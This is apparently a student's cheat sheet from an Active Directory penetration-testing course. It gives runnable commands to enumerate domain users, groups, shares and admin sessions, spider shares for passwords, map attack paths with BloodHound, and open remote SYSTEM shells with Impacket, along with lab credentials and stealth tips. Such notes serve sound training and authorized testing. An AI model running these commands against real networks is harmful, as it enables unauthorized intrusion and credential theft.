# Section 14 — Credentialed Enumeration from Linux

---

## QUICK REFERENCE — Full Workflow

```bash
# STEP 1 — Users + badpwdcount
nxc smb 172.16.5.5 -u forend -p Klmcargo2 --users

# STEP 2 — Groups (note high-value ones)
nxc smb 172.16.5.5 -u forend -p Klmcargo2 --groups

# STEP 3 — Logged-on users (hunt DA sessions)
nxc smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users

# STEP 4 — Shares
nxc smb 172.16.5.5 -u forend -p Klmcargo2 --shares

# STEP 5 — Spider interesting share
nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'

# STEP 6 — Privileged users (recursive nested group membership)
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU

# STEP 7 — BloodHound collection
sudo bloodhound-python -u forend -p Klmcargo2 -ns 172.16.5.5 -d inlanefreight.local -c all
```

**Lab creds:** `forend` / `Klmcargo2` | **DC:** `172.16.5.5`

---

## Lab Attack Chains

### Find user by RID
```bash
rpcclient -U "forend%Klmcargo2" 172.16.5.5
queryuser 0x492     # decimal 1170 → hex 0x492
# Result: mmorgan (Matthew Morgan) — Domain Admin + AS-REP roastable
```

### Find group member count
```bash
nxc smb 172.16.5.5 -u forend -p Klmcargo2 --groups | grep -i "Interns"
# Result: Interns membercount: 10
```

---

## nxc / CrackMapExec

```bash
nxc smb 172.16.5.5 -u forend -p Klmcargo2 --users          # users + badpwdcount
nxc smb 172.16.5.5 -u forend -p Klmcargo2 --groups         # groups + member count
nxc smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users  # active sessions
nxc smb 172.16.5.5 -u forend -p Klmcargo2 --shares         # share permissions
nxc smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
# Spider output: /tmp/cme_spider_plus/<ip>.json
```

**Pwn3d!** in output = local admin on that host.

Hunt in spidered shares for: `web.config`, `.bat`, `.ps1`, `password` in filename.

---

## SMBMap

```bash
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

---

## rpcclient

```bash
rpcclient -U "forend%Klmcargo2" 172.16.5.5
```

| Command | Output |
|---------|--------|
| `enumdomusers` | All domain users with RIDs |
| `queryuser 0x457` | Specific user by RID (hex) |
| `enumdomgroups` | All domain groups |
| `querygroup 0x200` | Specific group by RID |
| `getdompwinfo` | Password policy |

**RID constants:** administrator = `0x1f4` | krbtgt = `0x1f6` | custom users start at `0x3e9`

---

## Impacket Shells

```bash
# psexec.py — SYSTEM shell via SMB (noisy — creates service)
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125

# wmiexec.py — semi-interactive via WMI (stealthier — no files dropped)
wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
```

| Tool | Noise | Runs As | Notes |
|------|-------|---------|-------|
| psexec.py | High | SYSTEM | Creates service, uploads file |
| wmiexec.py | Medium | Auth user | No files dropped, logs 4688 |

---

## Windapsearch

```bash
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -U    # all users
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -C    # all computers
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da  # Domain Admins
python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU   # privileged users (recursive)
```

`-PU` = recursive — finds DAs via nested group membership that simple enumeration misses.

---

## BloodHound.py

```bash
sudo bloodhound-python -u forend -p Klmcargo2 -ns 172.16.5.5 -d inlanefreight.local -c all
zip -r ilfreight_bh.zip *.json    # zip for upload

# Start GUI
sudo neo4j start
bloodhound
# Default creds: neo4j / HTB_@cademy_stdnt!
```

**Key queries to run:**
- Find Shortest Paths To Domain Admins
- Find All Domain Admins
- Find Principals with DCSync Rights
- Find Computers with Unconstrained Delegation
- Find AS-REP Roastable Users

---

## Exam Notes

- `Pwn3d!` = local admin on that host
- `--loggedon-users` against file/SQL/Exchange servers = hunt DA sessions
- wmiexec.py is stealthier than psexec.py — prefer when noise matters
- windapsearch `-PU` = recursive — catches nested DAs
- BloodHound `-c all` = run as soon as you have any creds
